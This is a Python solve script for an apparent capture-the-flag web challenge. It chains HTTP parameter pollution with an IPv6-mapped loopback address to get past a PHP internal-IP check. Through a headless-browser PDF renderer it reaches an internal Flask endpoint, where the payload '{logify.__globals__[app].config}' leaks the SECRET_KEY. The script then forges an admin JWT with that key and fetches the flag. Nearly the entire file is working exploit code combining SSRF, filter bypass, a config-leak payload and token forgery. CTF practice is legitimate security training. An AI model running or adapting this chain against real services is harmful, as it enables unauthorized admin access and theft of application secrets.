import requests
import jwt


# BASE_URL = "http://154.57.164.74:32134"
BASE_URL = "http://localhost:8000"
FRONTEND_URL = f"{BASE_URL}/bartender.php"
LOGS_URL = f"{BASE_URL}/logs"
ADMIN_URL = f"{BASE_URL}/bartender"


def solve():
    # This is the malicious URL we want Selenium to visit.
    # It includes a payload that will leak the Flask app's config (including SECRET_KEY) to our logs endpoint.
    malicious_url = "http://127.0.0.1:5000/logs?leak={logify.__globals__[app].config}"

    # This is the safe URL that we want PHP to see for its security checks.
    # It bypasses the HPP vulnerability by being the last 'url' parameter, while the malicious one is the first.
    # Also it bypasses the "internal_ip" check because it's an IPv6-mapped IPv4 address, which the PHP filter doesn't cover.
    safe_url = "http://[::ffff:127.0.0.1]:5000/logs"

    print("[*] Triggering HPP bypass...")
    params = [
        ('url', malicious_url),
        ('url', safe_url),
        ('name', 'vego'),
        ('secret', 'pwned')
    ]

    response = requests.get(FRONTEND_URL, params=params)
    if "no_way.pdf" in response.url:
        print("[-] Redirected to no_way.pdf!")
        exit(-1)

    pdf = requests.get(response.url)
    if pdf.status_code != 200:
        print("[-] Failed to get PDF.")
        exit(-1)

    # NOTE: The first time the PDF might be empty because the logs haven't been updated yet,
    #       so we might need to run this script twice.
    print("[+] PDF saved locally as \"leaked.pdf\"")
    with open("leaked.pdf", "wb") as f:
        f.write(pdf.content)

    # Yeah, I'm lazy af and I prefer to get it from the PDF instead of parsing it :)
    secret_key = input("[*] Enter the leaked SECRET_KEY from the logs: ")

    print("[*] Forging admin JWT...")
    token = jwt.encode({"is_admin": True, "username": "bartender"}, secret_key, algorithm="HS256")
    
    print("[*] Fetching the Flag...")
    internal_target = f"http://127.0.0.1:5000/bartender?token={token}"
    params = [
        ('url', internal_target),
        ('url', safe_url),
        ('name', 'vego'),
        ('secret', 'pwned')
    ]

    # We need to make a request to the frontend to trigger the Selenium browser to visit our
    # internal target with the forged token.
    r = requests.get(FRONTEND_URL, params=params)
    
    r_flag = requests.get(r.url)
    with open("flag.pdf", "wb") as f:
        f.write(r_flag.content)

    print("[+] Flag PDF saved locally as \"flag.pdf\"")


if __name__ == "__main__":
    solve()